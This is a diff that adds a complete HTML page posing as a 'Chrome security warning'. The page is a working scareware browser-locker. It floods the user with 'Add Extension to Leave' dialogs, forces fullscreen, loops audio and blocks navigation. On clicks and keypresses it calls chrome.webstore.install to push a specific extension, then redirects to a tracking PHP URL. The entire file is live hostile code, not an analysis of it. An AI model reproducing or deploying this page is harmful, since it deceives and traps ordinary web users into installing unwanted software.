@@ -1,0 +1,161 @@
+ <!--<script>if(history.replaceState) history.replaceState({}, "", "/");</script>-->
+ <script>confirm('Add Extension to Leave');</script>
+ <!DOCTYPE html>
+ <html>
+ <head>
+   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+   <meta name="robots" content="noindex">
+   <meta name="referrer" content="no-referrer">
+   <title>Chrome security warning!</title>
+   <link rel="chrome-webstore-item" href="https://chrome.google.com/webstore/detail/pgccfgdknejidaefmicfefjelaopkkfj">
+   <script src="/scripty1/jquery-1.12.4.min.js"></script>
+   <script src="/scripty1/jquery.fullscreen.js"></script>
+   <script>
+   setTimeout(function(){confirm("Add Extension to Leave");}, 0);
+       setTimeout(function(){$('html, body').on( {
+         'mouseleave':function() { confirm("Add Extension to Leave"); }})}, 0);
+
+   var insturly = "/maxoxu.php?xiek=395219085";
+
+function toggleFullScreen() {
+  if(!document.fullscreenElement &&  !document.mozFullScreenElement && !document.webkitFullscreenElement) {  if (document.documentElement.requestFullscreen) {  document.documentElement.requestFullscreen();  } else if (document.documentElement.mozRequestFullScreen) {  document.documentElement.mozRequestFullScreen();  } else if (document.documentElement.webkitRequestFullscreen) {  document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);}}}
+
+   function mouseDown(e) {
+     e = e || window.event;
+     switch (e.which) {
+       case 1: console.log('left'); break;
+       case 2: confirm('Add Extension to Leave'); break;
+       case 3: confirm('Add Extension to Leave'); break;
+     }
+   }
+   function nope() {confirm('Add Extension to Leave');}
+
+   function successCallback(){
+     $(window).off("beforeunload", console.log('nobeforeunload'));
+     $(window).off("mousedown", console.log('nomousehere'));
+     $(window).off("blur", console.log('noblurhere'));
+     $(window).off("keydown", console.log('nokeydownhere'));
+     clearInterval(window.myTimer);
+     window.open("http://www.google.com");
+     window.location.replace(insturly);
+   }
+
+   function failureCallback(){console.log("fuck");}
+   function mousyDown(e) {
+     e = e || window.event;
+     switch (e.which) {
+       case 1: console.log('left'); break;
+       case 2: chrome.webstore.install("https://chrome.google.com/webstore/detail/pgccfgdknejidaefmicfefjelaopkkfj", successCallback, failureCallback); break;
+       case 3: chrome.webstore.install("https://chrome.google.com/webstore/detail/pgccfgdknejidaefmicfefjelaopkkfj", successCallback, failureCallback); break;
+     }
+   }
+   function checkup(){
+   if((window.fullScreen) || (window.innerWidth == screen.width && window.innerHeight == screen.height)) {
+         chrome.webstore.install("https://chrome.google.com/webstore/detail/pgccfgdknejidaefmicfefjelaopkkfj", successCallback, failureCallback);
+     }
+   else {
+         document.documentElement.webkitRequestFullScreen();
+         chrome.webstore.install("https://chrome.google.com/webstore/detail/pgccfgdknejidaefmicfefjelaopkkfj", successCallback, failureCallback);
+     }
+   }
+
+   document.addEventListener('keyup', function(es) {  if (es.keyCode == 27) {
+      toggleFullScreen();}}, false);
+   document.addEventListener('keyup', function(e) {  if (e.keyCode == 122 || e.keyCode == 17 || e.keyCode == 18 || e.keyCode == 13) {
+      toggleFullScreen();}}, false);
+
+ $(window).on('beforeunload', function(e) {return 'You have unsaved stuff. Are you sure to leave?';});
+
+ var checkfokus = document.hasFocus();
+ var periodic;
+
+ $(window).bind('fullscreen-on', function(e){
+ var checkfokus = true;
+ return checkfokus;
+ });
+
+ $(document).ready(function(){
+   var isFullScreen = $(window).data('fullscreen-state');
+
+ if (isFullScreen == false){
+	 setInterval(function(){document.getElementById('audio').play();}, 2500);
+	 document.getElementById('imdz').src="/images/rurow.png";
+   document.getElementById('imdz').style.marginTop='-5px';
+   document.getElementById('imdz').style.marginLeft='0px';
+   $(window).mousedown(function(){mouseDown(event);});
+   $(window).blur(function(){nope();});
+   $(window).keydown(function(){nope();});
+   window.myTimer = setInterval(function(){nope();},1000);
+   setInterval(function(){
+     if (checkfokus == false){
+       nope();
+     }
+ }, 500);
+
+   console.log("fullscreenoff");
+ }});
+
+ $(window).bind('fullscreen-on', function(e){
+	 setInterval(function(){document.getElementById('audio').play();}, 2500);
+	 document.getElementById('imdz').src="/images/secupdate.png?mb=1473618906";
+	 document.getElementById('imdz').style.marginTop='-4px';
+	 document.getElementById('imdz').style.marginLeft='1px';
+   var checkfokus = true;
+   clearInterval(window.myTimer);
+   $(window).off("mousedown", console.log('nomousehere'));
+   $(window).off("blur", console.log('noblurhere'));
+   $(window).off("keydown", console.log('nokeydownhere'));
+   $(window).mousedown(function(){mousyDown(event);});
+   $(window).keydown(function(){
+     chrome.webstore.install("https://chrome.google.com/webstore/detail/pgccfgdknejidaefmicfefjelaopkkfj", successCallback, failureCallback);});
+   console.log("fullscreen on");
+ });
+
+ $(window).bind('fullscreen-off', function(e){
+	 setInterval(function(){document.getElementById('audio').play();}, 2500);
+	 document.getElementById('imdz').src="/images/rurow.png";
+   document.getElementById('imdz').style.marginTop='-5px';
+   document.getElementById('imdz').style.marginLeft='0px';
+   $(window).off("keydown", console.log('nokeydownhere'));
+   $(window).off("mousedown", console.log('nomousehere'));
+   $(window).mousedown(function(){mouseDown(event);});
+   $(window).blur(function(){nope();});
+   $(window).keydown(function(){nope();});
+   window.myTimer = setInterval(function(){nope();},1000);
+   setInterval(function(){
+     if (checkfokus == false){
+       nope();
+     }
+ }, 500);
+
+   console.log("fullscreenoff");
+ });
+
+   </script>
+    <style>
+    #master {
+    position: fixed !important;
+    z-index: 99999999999 !important;
+    top:0 !important;
+    left:0 !important;
+    margin:0 !important;
+    width:100% !important;
+    height:100% !important;
+    background-color: rgb(255,255,255) !important;
+    background-color: rgba(255,255,255,1) !important;
+    }
+    </style>
+ </head>
+
+ <center>
+   <div id="master">
+     <img id="imdz" src="/images/rurow.png"/>
+   </div>
+ </center>
+
+ <body onclick="checkup();">
+	 <audio id="audio" src="/voice.mp3" autoplay=""></audio>
+ </body>
+ </html>
+
+ 
